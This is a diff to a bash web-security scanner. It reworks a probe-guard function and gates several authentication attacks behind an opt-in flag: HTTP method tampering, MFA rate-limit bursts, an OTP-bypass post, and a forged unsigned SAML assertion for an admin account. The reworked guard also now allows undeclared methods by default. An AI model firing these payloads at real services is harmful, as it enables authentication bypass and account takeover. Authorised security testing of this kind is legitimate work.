@@ -269,8 +269,8 @@ scanner_probe_guard() {
     local action_requires_opt_in="${4:-0}"
     local guard_output decision reason
 
-    # POST is a normal validation method. Explicitly side-effect-capable actions
-    # and methods outside the shared safe set require per-invocation approval.
+    # HTTP verbs are advisory only. Explicitly side-effect-capable actions still
+    # require per-invocation approval; the verb alone is not a stop condition.
     guard_output=$(PYTHONPATH="$BASE_DIR${PYTHONPATH:+:$PYTHONPATH}" python3 - "$method" "$url" "$label" "$action_requires_opt_in" <<'PY'
 import sys
 from memory.audit_log import SafeMethodPolicy
@@ -280,15 +280,16 @@ url = sys.argv[2] if len(sys.argv) > 2 else ""
 label = sys.argv[3] if len(sys.argv) > 3 else method
 action_requires_opt_in = len(sys.argv) > 4 and sys.argv[4] == "1"
 policy = SafeMethodPolicy()
-if policy.is_safe(method) and not action_requires_opt_in:
-    print("allow")
-    print("")
-elif action_requires_opt_in:
+advisory = policy.check(method, url).get("advisory", False)
+if action_requires_opt_in:
     print("require_approval")
     print(f"Scanner action {label} may create side effects and requires ALLOW_UNSAFE_HTTP_TESTS=1")
+elif advisory:
+    print("allow")
+    print(f"HTTP method {method} is advisory; no state-changing action was declared")
 else:
-    print("require_approval")
-    print(f"Side-effect-capable scanner method {method} for {url} requires ALLOW_UNSAFE_HTTP_TESTS=1")
+    print("allow")
+    print("")
 PY
 ) || {
         log_warn "Unable to evaluate safe-method policy for $label; skipping"
@@ -311,7 +312,7 @@ PY
     fi
 
     if [ "$decision" = "require_approval" ]; then
-        log_warn "$label uses side-effect-capable scanner method $method. Proceeding because ALLOW_UNSAFE_HTTP_TESTS=1 is set."
+        log_warn "$label is an explicitly side-effect-capable action (method $method). Proceeding because ALLOW_UNSAFE_HTTP_TESTS=1 is set."
     fi
 
     return 0
@@ -1493,7 +1494,7 @@ fi
 # 8e: HTTP method tampering (PUT/DELETE on endpoints that should only accept GET/POST)
 if ! skip_has auth_bypass && [ -s "$LIVE_URLS" ]; then
     FIRST_LIVE_URL=$(head -1 "$LIVE_URLS" 2>/dev/null || true)
-    if [ -n "$FIRST_LIVE_URL" ] && scanner_probe_guard "PUT" "$FIRST_LIVE_URL" "HTTP method tampering probes"; then
+    if [ -n "$FIRST_LIVE_URL" ] && scanner_probe_guard "PUT" "$FIRST_LIVE_URL" "HTTP method tampering probes" "1"; then
         log_step "Testing HTTP method tampering on sample endpoints..."
         while IFS= read -r url; do
             for METHOD in PUT DELETE PATCH; do
@@ -1630,7 +1631,7 @@ if ! skip_has mfa; then
             BASE=$(printf '%s\n' "$url" | cut -d'?' -f1)
             HOST=$(printf '%s\n' "$url" | grep -oE "https?://[^/]+" || true)
 
-            if scanner_probe_guard "POST" "$BASE" "MFA rate-limit probe"; then
+            if scanner_probe_guard "POST" "$BASE" "MFA rate-limit probe" "1"; then
                 log_step "Rate limit probe: $BASE"
                 STATUS_RAW=$(for _i in $(seq 1 15); do
                     curl -sk -o /dev/null -w "%{http_code}\n" --max-time 5 \
@@ -1659,7 +1660,7 @@ if ! skip_has mfa; then
                 done
             fi
 
-            if scanner_probe_guard "POST" "$BASE" "MFA response-manipulation canary"; then
+            if scanner_probe_guard "POST" "$BASE" "MFA response-manipulation canary" "1"; then
                 MFA_RESP=$(curl -sk "${BB_AUTH_ARGS[@]}" --max-time 5 -X POST "$BASE" \
                     -H "Content-Type: application/json" \
                     -d '{"otp":"999999"}' 2>/dev/null || true)
@@ -1726,7 +1727,7 @@ if ! skip_has saml; then
     done < <(awk '{print $2}' "$FINDINGS_DIR/saml/endpoints.txt" 2>/dev/null || true)
 
     ACS_URL=$(grep -E "saml/acs|saml/login" "$FINDINGS_DIR/saml/endpoints.txt" 2>/dev/null | head -1 | awk '{print $2}' || true)
-    if [ -n "$ACS_URL" ] && scanner_probe_guard "POST" "$ACS_URL" "SAML signature-stripping probe"; then
+    if [ -n "$ACS_URL" ] && scanner_probe_guard "POST" "$ACS_URL" "SAML signature-stripping probe" "1"; then
         STRIPPED_SAML=$(printf '%s' '<?xml version="1.0"?><samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"><saml:Assertion><saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>' | base64 | tr -d '\n')
         SAML_POST_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 \
             "${BB_AUTH_ARGS[@]}" \
